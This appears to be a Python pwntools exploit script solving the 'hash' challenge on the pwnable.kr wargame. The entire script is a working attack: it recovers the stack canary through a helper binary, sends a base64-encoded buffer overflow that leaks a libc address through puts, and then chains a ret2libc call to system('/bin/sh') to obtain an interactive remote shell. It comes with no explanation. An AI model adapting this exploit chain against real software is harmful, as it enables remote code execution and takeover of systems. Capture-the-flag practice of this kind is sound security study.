from pwn import *
from base64 import *

context.log_level = 'debug'

#s = process("./hash")
s = remote("pwnable.kr",9002)
c = process("./hash_cana")
e = ELF("./hash")
libc = e.libc

pr = 0x804880c
bss = 0x804b0a0

s.recvuntil("Are you human? input captcha : ")

captcha = s.recvuntil("\n")
captcha = captcha.replace("\n","")
captcha = captcha.replace(" ","")

c.sendline(captcha)
canary = c.recvuntil("\n")
canary = canary.replace("\n","")
canary = int(canary,16)

s.sendline(captcha)

s.recvuntil("Encode your data with BASE64 then paste me!")

pay = "A"*512
pay += p32(canary)
pay += "B"*12
pay += p32(e.plt['puts'])
pay += p32(pr)
pay += p32(e.got['puts'])
pay += p32(0x0804908F)

s.sendline(b64encode(pay))
s.recvuntil("\n")
s.recv(45)
leak = u32(s.recv(4))
base = leak - libc.symbols['puts']
binsh = base + next(libc.search("/bin/sh"))

log.info("leak : " + hex(leak))
log.info("binsh : " + hex(binsh))

c = process("./hash_cana")

s.recvuntil("Are you human? input captcha : ")

captcha = s.recvuntil("\n")
captcha = captcha.replace("\n","")
captcha = captcha.replace(" ","")

c.sendline(captcha)
canary = c.recvuntil("\n")
canary = canary.replace("\n","")
canary = int(canary,16)

s.sendline(captcha)

s.recvuntil("Encode your data with BASE64 then paste me!")

pay = "A"*512
pay += p32(canary)
pay += "B"*12
pay += p32(e.plt['system'])
pay += "AAAA"
pay += p32(binsh)

s.sendline(b64encode(pay))

s.interactive()
